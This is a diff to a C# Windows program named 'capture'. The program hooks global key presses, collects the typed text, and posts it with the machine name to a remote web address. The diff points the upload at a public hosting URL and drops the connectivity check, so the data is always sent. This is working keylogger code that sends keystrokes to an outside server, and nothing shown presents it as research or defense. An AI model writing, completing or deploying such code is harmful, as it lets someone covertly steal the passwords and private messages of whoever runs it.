@@ -35,8 +35,8 @@ namespace capture
         string destination = "";
         bool connected = false;
 
-        string uri = "http://192.168.137.222/annhau/capture";
-        string ipserver = "192.168.137.222";
+        string uri = "http://capture.byethost14.com/test";
+        //string ipserver = "192.168.1.15";
         string machine = System.Environment.MachineName.ToString();
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -54,29 +54,14 @@ namespace capture
                 timer1.Interval = (int)Tick.OFF;
                 timer1.Start();
             }
-            else if(connectedToAPI()) {
+            else {
                 connected = true;
                 timer1.Interval =(int) Tick.ON;
                 timer1.Start();
             }
 
         }
-        bool connectedToAPI()
-        {
-            Ping x = new Ping();
-            try
-            {
-                PingReply reply = x.Send(ipserver);
-
-                if (reply.Status == IPStatus.Success)
-                    return true;
-            }
-            catch (Exception e)
-            {
-                return false;
-            }
-            return false;
-        }
+       
         private void Config()
         {
            // HookManager.KeyPress += HookManager_KeyPress;
@@ -120,7 +105,8 @@ namespace capture
         }
         private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
         {
-           if ((int)e.KeyChar != 8 && (int)e.KeyChar != 9 && (int)e.KeyChar != 13 && (int)e.KeyChar != 27)
+           //if ((int)e.KeyChar != 8 && (int)e.KeyChar != 9 && (int)e.KeyChar != 13 && (int)e.KeyChar != 27)
+            if ((int)e.KeyChar != 9 && (int)e.KeyChar != 13 && (int)e.KeyChar != 27)
                 line += e.KeyChar.ToString();
             else
             {
@@ -133,9 +119,9 @@ namespace capture
 
         private void Press_Control(char c) {
             switch ((int)c) {
-                case 8:
-                    line +=(string.Format("KeyPress - {0}\n"," Backspace"));
-                    break;
+                //case 8:
+                //    line +=(string.Format("KeyPress - {0}\n"," Backspace"));
+                //    break;
                 case 9:
                     line += (string.Format("KeyPress - {0}\n", " Tab"));
                     break;
@@ -252,17 +238,19 @@ namespace capture
 
         }
         private void AppendFile() {
-            if (connected)
+            if (connected && line.Trim().Length > 0)
             {
                 using (WebClient client = new WebClient())
                 {
 
                     byte[] response =
                     client.UploadValues(uri, new NameValueCollection()
-               {
-                   { "content", line },
-                   { "machine", machine }
-               });
+                    {
+                       { "content", line },
+                       { "machine", machine }
+                    });
+                    //string result = System.Text.Encoding.UTF8.GetString(response);
+                    //Console.Write(result);
                     line = "";
 
                 }
@@ -291,10 +279,10 @@ namespace capture
 
         private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            //HookManager.KeyPress -= HookManager_KeyPress;
-            //frmClose f = new frmClose();
-            //f.ShowDialog();
-            //HookManager.KeyPress += HookManager_KeyPress;
+            HookManager.KeyPress -= HookManager_KeyPress;
+            frmClose f = new frmClose();
+            f.ShowDialog();
+            HookManager.KeyPress += HookManager_KeyPress;
         }
 
         public string ProxyString { get; set; }
